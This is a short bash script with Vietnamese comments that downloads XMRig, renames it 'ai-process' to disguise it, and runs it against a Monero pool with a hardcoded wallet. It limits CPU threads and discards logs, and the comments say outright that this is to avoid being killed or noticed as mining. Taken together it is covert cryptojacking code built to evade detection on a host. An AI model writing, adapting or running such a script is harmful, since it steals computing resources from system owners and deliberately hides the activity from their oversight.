#!/bin/bash

FAKE_NAME="ai-process"
POOL_URL="pool.hashvault.pro:443"
WALLET="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"

# Tải XMrig nếu chưa có
if [ ! -f "./xmrig" ]; then
    echo "[*] Đang tải XMrig..."
    curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
    tar -xf xmrig.tar.gz
    mv xmrig-*/xmrig . && chmod +x xmrig
    rm -rf xmrig-*
fi

# Đổi tên giả và phân quyền
cp xmrig $FAKE_NAME
chmod +x $FAKE_NAME

# Chỉ sử dụng một phần CPU để tránh bị kill (giảm dấu hiệu "khai thác")
TOTAL_CORES=$(nproc)
# Dùng 50% số luồng hoặc tối đa 8 luồng (tùy cái nào nhỏ hơn)
CORES_TO_USE=$((TOTAL_CORES / 2))
if [ $CORES_TO_USE -gt 8 ]; then
    CORES_TO_USE=8
fi

echo "[*] Đang chạy tiến trình '$FAKE_NAME' sử dụng $CORES_TO_USE luồng CPU..."

# Chạy miner, KHÔNG dùng 1GB pages để tránh lỗi bị kill
./$FAKE_NAME -o $POOL_URL -u $WALLET -k --tls --donate-level 0 \
    --cpu-max-threads-hint=$CORES_TO_USE \
    --randomx-no-numa \
    --threads=$CORES_TO_USE \
    --log-file=/dev/null &

# In PID của tiến trình miner
echo "[*] Miner đang chạy với PID: $!"

# Giữ script sống
while true; do sleep 60; done
